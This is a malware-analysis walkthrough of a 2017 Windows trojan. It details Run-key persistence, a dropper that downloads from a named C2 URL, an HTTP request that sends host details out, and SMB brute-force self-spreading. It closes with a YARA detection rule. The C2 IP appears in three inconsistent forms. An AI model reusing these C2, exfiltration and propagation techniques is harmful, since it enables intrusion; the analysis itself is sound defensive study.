# Prelude
Today, we're going to reverse engineer a real-world RAT (Remote Access Trojan) malware, and understand what it does exactly. This project will teach us a lot about common malware techniques and reverse engineering. I found the malware [here](https://github.com/fabrimagic72/malware-samples/tree/master/Generic%20Trojan). It is the first file in the folder linked, with MD5 `149979213411fcac20f7cbc1a26e1521b80073aff05d4c0f967046ef5f23b13a`. 
# Disclaimer
I'm analyzing this malware on a Windows VM that isn't connected to the internet and doesn't have any shared files with my host. **Please** only analyze malware on isolated environments to not infect yourself and others on your network.
# Tools We'll Be Using
- The first tool we use is called [IDA](https://hex-rays.com/ida-free/). We use the free version for disassembling the binary and writing comments. It also has a paid version for companies and people that do reverse engineering professionally
- Our second tool is [OllyDbg](https://www.ollydbg.de/). It is an amazing debugger for the Windows platform that is really fun to use and easy to learn.
- Finally, we'll also be using the [Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). This is a suite of tools created by Mark Russinovich that helps a lot when doing things related to the WinAPI (Windows API) and Windows Internals.
# Getting Started
The first thing we will do is search for the hash of the malware on [Virustotal](https://virustotal.com):
![virustotal-hash][/assets/img/analyzingtrojan/virustotal_hash.png]
_The Virustotal Hash_
This gives a pretty strong indicator that this is indeed malware (64/72 = 88% of vendors marked is as such). Virustotal also has a "details" tab that shows more technical details about the malware (what IPs it communicates with, what files it changes etc.), but we won't be using it today to not give us "spoilers" for the analysis. 
The `file` command indicates that this is a PE32 executable, or in other words a `.exe` for 32 bit Windows:
![file-command-output][/assets/img/analyzingtrojan/file_command_output.png]
A good starting point when analyzing malware is to look at the strings, by running a command such as `strings`. Sometimes the strings will be obfuscated (for example using `exe.dmc` instead of `cmd.exe` and then reversing it inside the code) and then you'll have to deobfuscate them, but in this case the strings are not obfuscated and look very interesting:
- The names of functions used by the malware
```

# The Main Function
A good way to start reverse engineering a program is often where it starts, which on the Windows platform is the `WinMain` function (sometimes malware authors put code before the `WinMain` function in order to make the malware harder to analyze, but in this case it doesn't happen). Here is how it starts:
![start-of-main][/assets/img/analyzingtrojan/start_of_main.png]
_The Start of Main_
Cool, so we have two calls here:
- The call to [WSAStartup](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup) initiates usage of the Winsock DLL. Here, two arguments are passed to it: The version, which in this case is `0x202` , and a pointer to the WSADATA structure that contains the details of the Windows Socket implementation. This is a good indicator that the malware uses socket communication.
- The second call is a call to  [GetModuleFileNameA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea)  with the following arguments `GetModuleFileNameA(NULL, ExistingFileName, 0x104)`. This call puts the path of the current executable into the buffer `ExistingFileName`. If we step through the function with OllyDbg, we see that `ExistingFileName` contains the current path of the executable:
![call-to-getmodulefilename][/assets/img/analyzingtrojan/call_to_getmodulefilenamea.png]
_Call To GetModuleFileNameA_
![contents-of-filename-buffer][/assets/img/analyzingtrojan/contents_of_filename_buffer.png]
_Contents of Filename Buffer_
Next we have some string operations that concatenate the current executable path with the string ` /SYNC` .
After that, we have a call to [RegCreateKeyExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa):
![call-to-regcreatekeyexa][/assets/img/analyzingtrojan/call_to_regcreatekeyexa.png]
_The Call to RegCreateKeyExA_
## A Registry?
The Windows Operating System has a component called the [Windows Registry](https://en.wikipedia.org/wiki/Windows_Registry). The Registry is an Hierarchical Database (in simple terms it just means that all keys except for special keys called **root keys** have parents) where apps and the OS itself can store data. For example:
- Have you ever booted up your computer and a program like Discord or Steam (or some malicious malwareðŸ˜ˆ) started up without you telling it to? That's possible thanks to the Registry
- Most programs save the location they are installed in in a registry key. This way, their uninstallers can know what files to remove.
The entries in the registry are called **keys**. Each key contains **value-data pairs**. The data can be of [these types](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types). For example, `REG_SZ` is the type for a null-terminated string. In our uninstaller example, the usage of the registry might look as such:
- Use the `HKLM\Software\<program name>` registry key
- Write the installation path (type `REG_SZ`) to the value `InstallPath`
All of this wouldn't be useful if there weren't a way to access the registry programmatically. That's the purpose of the [Registry API](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-functions). Here is a simple example of CRUD operations on the registry:
```
#include <Windows.h>
#include <stdio.h>

int main() {
	HKEY hKey;
	DWORD dataToWrite = 1234;
	const BYTE *dataPtr = (BYTE *)&dataToWrite;
	DWORD lpType;
	DWORD lpDataRes;
	DWORD lpcbData;

	// Create
	RegCreateKeyExA(HKEY_CURRENT_USER, // Open HKEY_CURRENT_USER Hive
		"SOFTWARE\\vaktibabat", // Create SOFTWARE\vaktibabat key
		0, // Reserved
		NULL,
		REG_OPTION_NON_VOLATILE, // Key should be non volatile, e.g. should be preserved when the computer is restarted 
		KEY_ALL_ACCESS, // We want to do whatever we want with the key
		NULL,
		&hKey, // Store a handle to the key in the hKey variable
		NULL
	);

	// Update
	RegSetValueExA(hKey, // The key we just created
		"hello_world", // Value name
		0, // Reserved
		REG_DWORD, // Data type
		dataPtr, // A pointer to the data we want to write
		sizeof(DWORD) // The size of the data we want to write
	);

	// Read
	RegGetValueA(hKey, // The key we set the value to
		NULL,
		"hello_world", // Value name
		RRF_RT_REG_DWORD, // Restrict the type to a DWORD
		&lpType, // Pointer that receives the type
		(VOID *)&lpDataRes, // Pointer that receives the data
		&lpcbData // Pointer that receives the size of the data
	);

	printf("Type: %d\nData: %d\nSize: %d\n", lpType, lpDataRes, lpcbData);

	RegCloseKey(hKey);

	// Delete
	RegDeleteKeyExA(HKEY_CURRENT_USER, // Hive
		"SOFTWARE\\vaktibabat", // Subkey
		KEY_WOW64_64KEY, // 64 bit view
		0);
}
```
The code already has comments, so I won't explain it further.
## Back To Our Analysis
Now that we know what the registry is and how to use it, we can see that the call to `RegCreateKeyExA` simply obtains a handle to the registry key `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`. This registry key controls the processes that automatically start when the machine is booted up, and malware often uses it for persistence. The malware then sets the value of the registry key:
![call-to-regsetvalueexa][/assets/img/analyzingtrojan/call_to_regsetvalueexa.png]
_The call to RegSetValueExA_
This puts a value named `PHIME2008` with the data `<curent path> /SYNC` in the `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` registry key. 
If we look at our registry after the call to [RegSetValueExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa) with the SysInternals Autoruns tool, we see:
![autostart-output-1][/assets/img/analyzingtrojan/autostart_output_1.png]
_Autostart Output_
![autostarts][/assets/img/analyzingtrojan/autostarts.png]
_b_
At the end of this post, we write a YARA rule for this trojan, and things like specific registry values are very helpful for this. The registry key is then closed:
![regclosekey][/assets/img/analyzingtrojan/regclosekey.png]
_The RegCloseKey call_
And now we have calls to two subroutines:
![main-sub-calls][/assets/img/analyzingtrojan/main_sub_calls.png]
_Calls to two subroutines_
# The first subroutine
The subroutine starts with some setup, and then a call to [GetSytemDirectoryA](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), which as the name suggests returns the path of the system directory:
![get-systemdir][/assets/img/analyzingtrojan/get_systemdirectorya.png]
_Call to GetSystemDirectoryA_
The function stores the system path into a buffer on the stack. With OllyDbg, we see that the system directory, at least on my machine is
![olly-systemdir][/assets/img/analyzingtrojan/olly_systemdir.png]
_The system directory in ollydbg_
Next, the string `\msupd.exe` is concatenated to this system path:
![listrcat_msupdexe][/assets/img/analyzingtrojan/lstrcar_msupdexe.png]
_b_
![olly-lstrcat-msupd][/assets/img/analyzingtrojan/olly_lstrcat_msupd.png]
_The lstrcat call_
The buffer now contains `C:\Windows\system32\msupd.exe`.
This is the next part of the subroutine:
![next-part-of-sub][/assets/img/analyzingtrojan/next_part_of_sub.png]
_The next part of the subroutine_
 [lopen](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-_lopen) is called on the path we just constructed in order to open `C:\Windows\system32\msupd.exe`.
It might seem like this is a legitimate Windows binary, but this is actually a malicious binary that the trojan adds to the system directory to make it seem genuine. This is also very helpful to our YARA rule.
If the call to `lopen` fails, the handle is closed and we return from the subroutine. Before we analyze what happens if the `lopen` call succeeds, we need to understand what DLLs are.
## What are DLLs?
If you took a compilation course, you may have heard the terms **Dynamic Linking** and **Static Linking**. The compilation process is composed of 4 steps:
![The Compilation Process][/assets/img/analyzingtrojan/GCC_CompilationProcess.png]
We'll focus on the last step, the linking. Suppose we write a game that uses some graphics library `graphicslib`. We have two options:
1. Compile our game so that `graphicslib` will reside inside the binary, meaning we can call it just like any other function; This option is called **Static Linking**
2. Whenever we need to call a function related to graphics, we load a **shared object** that exports the functions of `graphicslib` into the memory of our process and call it from there; This option is called **Dynamic Linking**. The Linux name for these objects is a "shared object", and the Windows name is a DLL which stands for "Dynamic Linked Library"
Let's look at some advantages and disadvantages of using static linking versus dynamic linking:
##### Metric 1: Space
- Dynamic linking is more efficient in terms of space, because the DLL only needs to reside once on disk, and then every process that needs it loads it at runtime
- Static linking needs to have the entire library in the binary itself, which causes the binary to be much larger. This is why Rust binaries are often much larger than C binaries
##### Metric 2: Portability
- Dynamic linking requires you to ship your app together with the DLLs
- Static linking only requires you to ship the binary.
##### Metric 3: Performance
- Dynamic linking has **some** overhead when we load the library and jump to the function in the library, but nowadays the difference in performance is pretty negligible
- Static linking doesn't have this overhead because the functions are already inside the library

The malware we're analyzing is using the `wininet` DLL and the `urlmon` DLL; Let's continue analyzing it to see what exactly it's doing with them.

---------------------------------------------------------
This is the block of code that is called if the `C:\Windows\system32\msupd.exe` was opened successfully:
![load-wininet][/assets/img/analyzingtrojan/load_wininet.png]
_Loading wininet DLL_
The block starts by copying the string `http://fukyu.jp/updata/ACCl3.jpg` to a buffer on the stack. It then calls the WinAPI function [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) with the parameter `wininet.dll`. This function loads a DLL into the address space of the current process, which suggests that the malware uses functions related to the internet (Since the DLL is `wininet.dll`). You'll often see this function used together with [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) to call a function from a DLL.
If the call wasn't successful, the subroutine returns, and otherwise it continues execution to this block:
![delete-urlcacheentry][/assets/img/analyzingtrojan/deleteurlcacheentry_getprocaddr.png]
_Getting the address of DeleteUrlCacheEntry_
This block calls [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) with the handle we just acquired to `wininet.dll` and  `DeleteUrlCacheEntry`. 
[GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) returns the address of a function or a variable inside a module. In our case, it loads the address of the function [DeleteUrlCacheEntry](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-deleteurlcacheentry) into the register `eax`. The function is then called with the parameter `http://fukyu.jp/updata/Accl3.jpg`, and the `wininet` DLL is freed:
![calling-deleteurlcacheentry][/assets/img/analyzingtrojan/call_to_deleteurlcacheentry.png]
_Deleting from the cache_
The [DeleteUrlCacheEntry](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-deleteurlcacheentry) function deletes its parameter from the cache. This is probably done here in order to not make the user suspicious. We then free `wininet.dll` because we don't need it anymore. To summarize how the function was called:
![dll-call-flowchart][/assets/img/analyzingtrojan/dll_call_flowchart.png]
_How the DLL is called here_
Then we do a similar thing with `urlmon.dll`, and call the function [URLDownloadToFileA](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)) which just downloads a file from the internet and saves it into a specified path:
![downloadfile][/assets/img/analyzingtrojan/urldownloadtofilea_call.png]
_Downloading the file_
The function is called with the parameters `http://fukyu.jp/updata/Accl3.jpg` and `C:\Windows\System32\msupd.exe`. This call downloads the file at `http://fukyu.jp/updata/Accl3.jpg` into the path `C:\Windows\System32\msupd.exe` on the local system. The `Accl3.jpg` is probably not a real `jpg` then. Unfortunately for us, the `fukyu.jp` domain is down,  which makes sense because it's a C2 server and the malware is from 2017 according to the GitHub repo, so we can't analyze the `Accl3.jpg` file further. The file is probably more malware. Malware that also download other malware are called **Droppers**.
Let's look at the next block:
![creatrpcoessa-block][/assets/img/analyzingtrojan/createprocessa_block.png]
_The CreateProcessA call_
Let's look at the parameters in OllyDbg:
![olly-createprocessa][olly_createprocessa.png]
_The parameters in OllyDbg_
The call to [CreateProcessA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) just runs the binary that was saved to `C:\Windows\system32\msupd.exe`. The further confirms our suspicion that `Accl3.jpg` is not a real JPG.

To summarize: This subroutine deletes `http://fukyu.jp/updata/Accl3.jpg` from the cache, downloads a file from a C2 Server, saves it under the name `C:\Windows\system32\msupd.exe`, and executes it.
# The Second Subroutine
The second subroutine starts with a call to [socket](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket):
![socket-init-block][/assets/img/analyzingtrojan/socket_init_block.png]
_Initializing the socket_
This block initializes a TCP socket:
- The register `ebx` is zeroed at the start of the function (Before the snippet), so the protocol is unspecified:
	"If a value of 0 is specified, the caller does not wish to specify a protocol and the service provider will choose the _protocol_ to use."
- The type is set to `1`, which corresponds to `SOCK_STREAM`
- The `af` is `2`, which means `AF_INET`. 
This is the next block:
![connect-block][/assets/img/analyzingtrojan/connect_block.png]
_Connecting_
This block calls [connect](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect).
As the first push indicates, the connection is made to port `0x50 = 80`,which is the port for HTTP.
The address is `125.206.117.59`.  This is a Japanese IP that communicates with many other trojans:
![japanaese-ip][/assets/img/analyzingtrojan/japanese_ip_virustotal.png]
_The IP on virustotal_
The next block constructs some data to send to the IP address:
![construct-data-block][/assets/img/analyzingtrojan/construct_data_block.png]
_Constructing the data_
The block starts with a call to `sub_401A70` with some buffer passed as an argument. The disassembly of this short subroutine is as follows:
![disassembly-of-time][/assets/img/analyzingtrojan/get_some_data_disas.png]
_Disassembly of the subroutine_
It starts with a call to [GetLocalTime](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getlocaltime), whose name is self-explanatory, and then calls `sprintf` to write some info related to the current time to the buffer that was passed as input. Specifically, it writes the following data into the buffer:
![olly-timebuf][/assets/img/analyzingtrojan/olly_timebuf.png]
_The result on OllyDbg_
This is deconstructed as follows:
`YYYYMMDDHHMMSS`
Let's go back to `main_sub_2`. We were here:
![getsomedata-block2][/assets/img/analyzingtrojan/get_some_data_block2.png]
_Block_
After the call to `get_some_data`, [GetLocaleInfoA](https://learn.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-getlocaleinfoa) is called to write the current locale ("United States", "Australia" etc.) into a buffer:
![localebuf][/assets/img/analyzingtrojan/localebuf.png]
  _Localebuf_
Next the [GetComputerNameA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea) function is called to retrieve the name of the current computer, which in my case is
![netbiosname-buf][/assets/img/analyzingtrojan/netbiosname_buf.png]
_The Computer name_
And finally another subroutine `sub_402090` is called:
![getipsub1][/assets/img/analyzingtrojan/getipsubroutine1.png]
_1_
![getipsub2][/assets/img/analyzingtrojan/getipsubroutine2.png]
_2_
It starts by calling [gethostname](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-gethostname) , which returns the hostname of the current machine. It then calls [gethostbyname](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-gethostbyname) on the retrieved hostname to get a pointer to a `hostent` structure. The `hostent` structure contains the following fields:
![hostent-typedef][/assets/img/analyzingtrojan/hostent_typedef.png]
_Typedef of HOSTENT structure_
The field at offset `0x0c` is accessed in the `mov edx, [eax+0Ch]`. This corresponds to the `h_addr_list` field, since every pointer is of size `4` bytes, and then each short is `2` bytes. The instruction `mov eax, [eax]`  dereferences the pointer to get the first member of `h_addr_list`, which the documentation says is a NULL terminated list that contains the addresses of the host. Then `inet_ntoa` is called on the first address of the current computer to convert it from decimal form to string form. In conclusion, this subroutine just returns the IP of the local computer, e.g.:
![hostip-buf][/assets/img/analyzingtrojan/hostip_buf.png]
_IP_
Let's go back to the second subroutine. We were here:
![back-to-secondsub1][/assets/img/analyzingtrojan/back_to_secondsub1.png]]
_1_
![back-to-secondsub2][/assets/img/analyzingtrojan/back_to_secondsub2.png]]
_2_
There's a check for whether getting the IP of the local computer succeeded. If it didn't succeed, we put it as the string "NONE". Then [GetUserNameA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea) is called to get the username of the person who ran the program. Finally, an HTTP request is constructed:
```
GET /updata/TPDB.php?lg1=... HTTP/1.1
Host: fukyu.jp
```
The `lg` parameters contain the information that was gathered throughout the subroutine. 
To finish analyzing this subroutine, let's make the malware send this HTTP request to our local server. Open the malware in OllyDbg, and step until you get to the second subroutine:
![call-to-second-sub][/assets/img/analyzingtrojan/call_to_second_sub.png]
_The call to the second subroutine in OllyDbg_
Our plan is to step until we get to the call to connect, where we'll change the IP address from `125.206.107.59` to `127.0.0.1`. Once you get there, it should look like this:
![call-to-connect][/assets/img/analyzingtrojan/call_to_connect.png]
_The call to connect in OllyDbg_
Did you know that IP addresses can be represented as numbers? IP addresses are simply four hex bytes, so the address `255.255.255.255` is simply `0xffffffff` (Each two hex digits are the corresponding number in the IP address). We'll utilize this fact to change the return value of `inet_addr`. After the call to `inet_addr`, `eax` contains the decimal representation of the IP address `125.206.117.59`:
![eax-ip][/assets/img/analyzingtrojan/eax_ip.png]
_The current IP in eax_
`0x3B = 59`
`0x75 = 117`
`0xCE = 206`
`0x7D = 125`
The order is reversed because the system is little-endian. Let's calculate the hex representation of `127.0.0.1`:
`127 = 0x7f`
`0 = 0x0`
`0 = 0x0`
`1 = 0x1`
The representation is `0x0100007f`. If so, we should change the value of `eax` to `0x0100007f`. Now just continue the execution with F9 (I also set a breakpoint after the call to end, so that the malware won't continue execution). We see the following request in our server logs:
![httpc2-log][/assets/img/analyzingtrojan/httpc2_log.png]
_The log of our HTTP server_
This is really cool! We got all the info that the malware gathered.

To summarize: This subroutine gathers info about the system and sends it to a C2 server in an HTTP request.
# Back to Main
Now that we finished analyzing the subroutines that main called, we can go back to `main`
![main-end][/assets/img/analyzingtrojan/main_end.png]]
_End of Main_
This part is a loop (The counter is `esi = 0x64 = 100`, which is decremented at the end of the block until it reaches 0). Every iteration starts a thread that executes the subroutine `sub_401870`, and then sleeps for `0x0d = 13` milliseconds. Let's analyze `sub_401870`:
# Analysis of the thread function
![threadfunc-start][/assets/img/analyzingtrojan/threadfunc_start.png]
_Start of main thread function_
The thread function starts by seeding the PRNG with [GetTickCount](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount)
This is done so that the PRNG won't return the same number every time. After some initialization of areas in memory, we have a block that stores a random IP inside a buffer on the stack:
![sprintf-ip][/assets/img/analyzingtrojan/sprintf_ip.png]
_Getting the random IP_
The `sub_401140` function just generates a random number using the PRNG and then shifts it right by 7 bytes to get a number in the range `0-255`
![gen-rand-int][/assets/img/analyzingtrojan/gen_rand_int.png]
_Random integer from 0-255_
After the call to `sprintf`, the buffer may contain for example
![sprintf-ip-olly][/assets/img/analyzingtrojan/sprintf_ip_olly.png]
_Buffer Contents_
We push our newly-generated buffer onto the stack and call another subroutine, `sub_401150`, whose goal is to make sure that the IP is a part of the local network (For example it checks that the IP is not a loopback address).
Once a valid IP is found, another subroutine is called to check whether port 445 is open on the randomly-generated IP:
![we-call-another-sub][/assets/img/analyzingtrojan/we_call_another_sub.png]
_Checking Whether port 445 is open on the randomly-generated IP_
Its argument is the randomly-generated IP. Here's the disassembly:
![start-of-performip][/assets/img/analyzingtrojan/start_of_performip.png]
_Start of the portscan function_
The function starts with initializing a socket with parameters `AF_INET, SOCK_STREAM, UNSPECIFIED_PROTOCOL`. If the socket was successfully initiated, a connection is made to port 445 of the randomly-generated IP:
![perform-on-ip2][/assets/img/analyzingtrojan/perform_on_ip_2.png]
_Second part of portscan function_
Port 445 is the default port for SMB servers. SMB is a protocol used for file sharing which makes it a very appealing target for malware. Directories shared on SMB are called **shares**. SMB also supports multiple user accounts, and has a special share called the IPC share that is used to enumerate information like what shares are available, what users are there, etc.
The return value is then computed as follows:
 After the call to `select`, the register `eax` will be a non-zero value if and only if the connection succeeded. `eax` is then stored into `edi`, which is then tested with itself. A  `setnle al` is executed. This instruction sets `al` if and only if `test edi, edi` didn't set the zero flag, meaning `edi` is non-zero. 
This is our return value.

Let's look at the block in `thread_func` that called `perform_on_ip`:
![thread-func-performip-block][/assets/img/analyzingtrojan/thread_func_performip_block.png]
_The block that called the portscan function_
If the connection wasn't successful (`al` was set to zero), the function goes back to the start of the loop to generate another random IP, until it finds an IP on which port 445 is open. If such an IP is found, a new IP is generated by replacing the last part of the previous IP with the number of the current iteration (This is done in a loop that executes 254 times). Then the function checks whether port 445 is open on this  new IP is open. If the port was closed, the function goes back to the start of this block, and if we have a successful connection the following block is executed:
![check-smb-call][/assets/img/analyzingtrojan/check_smb_call.png]
_The call to checksmb_
The block starts with a call to `sprintf` which puts a `\\` at the start of our random IP to get the SMB name. Let's look at `check_smb`:
The first interesting part is this block, where we connect to the IPC share:
![check-smb-start][/assets/img/analyzingtrojan/check_smb_start.png]
_The start of checksmb_
This is pretty simple. The name of the IPC share is constructed with a call to `sprintf`:
`sprintf(buf, "%s\\ipc$", the_ip)`. Then `WNetAddConnection2A` is called to connect to the IPC share. The username and password are NULL, which means that the username and password of the current user are used.
If the connection is successful, `NetUserEnum` is called to enumerate all the users on the current share:
![call-to-netuserenum][/assets/img/analyzingtrojan/netuserenum.png]
_The call to netuserenum_
The following parameters are interesting:
- The info is stored in `bufptr`
- The filter is `FILTER_NORMAL_ACCOUNT`, so normal user data is gathered
- The level is 0, so user account names are enumerated
Afterwards, some error checking is performed, and another subroutine, `bruteforce_smb` is called:
![bruteforcesmb-call][/assets/img/analyzingtrojan/bruteforce_smb_call.png]
_The call to bruteforcesmb_
The function is called with the following parameters:
- The IP address, e.g. `\\127.0.0.1`
- The first username that `NetUserEnum` found.
The `bruteforce_smb` function starts by loading a list of passwords into `eax`:
![load-list-of-passwords][/assets/img/analyzingtrojan/start_bruteforce_smb.png]
_Loading a list of passwords into eax_
![passwords-in-memory][/assets/img/analyzingtrojan/passwords_memroy.png]
_The passwords in memory_
Then, after some error checking, it executes the following loop, whose purpose is to bruteforce the password to the SMB share:
![loop-bruteforce-smb][/assets/img/analyzingtrojan/loop_bruteforce_smb.png]
_The loop that bruteforces the password_
In the start of the loop, `ebx` is zeroed, the IP is stored into `ebp`, the username is stored into `edi`, and then the `exploit_smb` function is called. Let's analyze `exploit_smb`. The first interesting call here is a call to `WNetAddConnection2A` with the username, the IP, and the current password:
![exploit-smb-connect][/assets/img/analyzingtrojan/exploit_smb_connect.png]
_Connecting to the SMB server_
After some error checking, if the connection was successful, the `CopyFileA` function is called to copy the executable of the malware to `\\<IP Address of SMB server>\admin$\system32\dnsapi.exe` in order to spread the malware further. As you may know, a malware that spreads itself is called a **virus**. After that, we send a message to the C2 server that indicates that the copy was OK (The username and the password are also sent here):
![send-data-c2-exploit-smb][/assets/img/analyzingtrojan/send_data_c2_exploit_smb.png]
_Sending the data to the C2_
Then [NetScheduleJobAdd](https://learn.microsoft.com/en-us/windows/win32/api/lmat/nf-lmat-netschedulejobadd) is called. This function submits a job to be run at a later time, and here it's used to execute `dnsapi.exe` on the infected server:
![netschedjobadd-call][/assets/img/analyzingtrojan/netschedulejobadd_call.png]
_b_
![netschedulejobadd-def][/assets/img/analyzingtrojan/netschedulejobadd_def.png]
_b_
The `JobId` passed is just a local variable that receives the output. The `Buffer` passed is a pointer to an `_AT_INFO` structure:
![atinfo-def][/assets/img/analyzingtrojan/atinfo_def.png]
_Definition of ATINFO structure_
The interesting thing to us here is that the command is the `dnsapi` virus we just copied. This means that the malware infects the `admin$` SMB share, and runs the malware there. Finally, it sends some data to the C2 indicating that the execution went fine:
![taskok-send][/assets/img/analyzingtrojan/taskok_send.png]
_Sending to the C2_
`exploit_smb` then cancels the connection with [WNEtCancelConnection2A](https://learn.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetcancelconnection2a) and returns.


This is it! We completely finished our analysis of the malware. This was very long, and I learned a ton from this (I hope that you learned from this too). This is the first real-world malware I'm analyzing, and it was very cool and fun. All that's left now is a final recap and writing a YARA rule to detect this malware

# A Recap
 Let's go over everything the malware does, and what we've learned from it:
- We started by analyzing the entry point of the malware, the `WinMain` function.
- We then saw that the malware changes a special registry key to make itself run every time the computer is booted up. This taught us about the registry
- We saw that the main function called two other subroutines, `main_sub_1` and `main_sub_2`.
- The `main_sub_1` subroutine drops a file `Accl3.jpg`  from a C2 server and saves it under the path `C:\Windows\System32\msupd.exe` to make it less suspicious. It does so using a function from a DLL
- It then starts the `msupd.exe` binary as a process
- This taught us about DLLs
- We then analyzed the second subroutine, `main_sub_2`:
- `main_sub_2` mostly sent data about the infected host to the C2 server
- We made it send the data it gathered to our HTTP server by playing with the registers in OllyDbg
- Then, we saw that the main function starts 100 threads that execute a function `thread_main`
- The `thread_main` function port-scans our entire local network and checks for open SMB Servers (Port 445)
- When it finds an open SMB Server, it connects to its IPC share using the current credentials
- It then bruteforces the password to get into the main share
- If it successfully connected, it sends data about the SMB server to the C2 server, and then copies itself to the path `\\server\\admin$\system32\dnsapi.exe`
- Then it runs itself on the other host by calling `NetScheduleJobAdd` to infect other computers

# Writing a YARA rule
Now let's summarize everything we've seen by writing a YARA rule that detects the malware. 
I won't go into detail about YARA rules here, but they are essentially custom rules you can add
to detect malware. 
```
rule phime
{
	strings:
		$reg_autostart = "PHIME2008"
		$dnsapi = "admin$\\system32\\dnsapi.exe"
		$msupd = "msupd.exe"
		$c2 = "fukyu.jp"
		$ip = "126.255.117.59"
		$mal_jpg = "Accl3.jpg"

	condition:
		$reg_autostart or $dnsapi or $msupd or $c2 or $ip or $mal_jpg
}
```
The `reg_autostart` is the value the malware adds to the registry. The `dnsapi` is the path to which the malware copies itself when it logs into an SMB server. The `msupd.exe` is where it saves `Accl3.jpg`. The `c2` is just the name of the C2 server. The `ip` is another C2 IP we've found, and finally the `mal_jpg` is the file the malware saves under `C:\System32\msupd.exe`. This rule matches the malware:
![yara-output][/assets/img/analyzingtrojan/yara_output.png]
_The output of our YARA rule_

This is it!

Hope you enjoyed this writeup!
